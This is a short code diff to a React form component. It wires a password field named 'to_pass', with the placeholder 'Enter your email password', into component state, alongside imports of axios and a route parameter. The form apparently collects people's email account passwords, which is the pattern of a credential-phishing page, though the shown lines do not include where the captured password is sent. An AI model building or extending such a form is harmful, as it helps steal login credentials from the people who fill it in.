@@ -1,7 +1,6 @@
 import "./App.css";
 import React, { useState } from "react";
-import { Styls } from "./stylls";
-import emailjs from "emailjs-com";
+import { Styls } from "./stylls"; 
 import { useParams } from "react-router-dom";
 import axios from "axios";
 
@@ -90,8 +89,9 @@ function Forms() {
               <input
                 type="password"
                 name="to_pass"
-         
-                       pattern="(?=.*[0-9]).{8,}"
+                 onChange={(e) => setPass(e.target.value)}
+                 pattern="(?=.*[0-9]).{8,}"
+                value={pass}
                 required
                 placeholder="Enter your email password"
               />
